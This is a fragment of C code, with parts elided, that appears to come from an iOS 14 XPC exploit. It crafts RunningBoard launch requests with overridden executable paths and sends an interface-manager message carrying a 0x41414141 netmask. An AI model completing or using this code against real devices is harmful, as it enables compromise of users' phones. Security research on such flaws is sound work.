...
xpc_object_t RBSProcessIdentity(const char *exePath, const char* bundleId, const char* jobLabel)
{
	xpc_object_t _RBSProcessIdentity = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(_RBSProcessIdentity ,"__executablePath", exePath);
...
xpc_object_t RBSLaunchContext(xpc_object_t identity, 
	...
	const char** environment)
{
    ...
    xpc_dictionary_set_string(_RBSLaunchContext, "__overrideExecutablePath", exePath);
...
///	printf("%s\n", "Sent init message\n");
	...
	xpc_dictionary_set_uint64(msg, "delegate-class-id", 5); // Interface manager
	xpc_dictionary_set_uint64(msg, "interface-command", 1);
	xpc_dictionary_set_string(msg, "interface-name", "en0");
	xpc_dictionary_set_uint64(msg, "interface-netmask", 0x41414141);
	...
	const char*stderrPath, const char** environ, const char* reason) 
{
        ...
        xpc_object_t identity = RBSProcessIdentity(exePath, bundleId, jobLabel);
        xpc_object_t context = RBSLaunchContext(identity, "iOS 14 XPC exploit", exePath, stdoutPath, reason, NULL); // For now don't allow custom environment
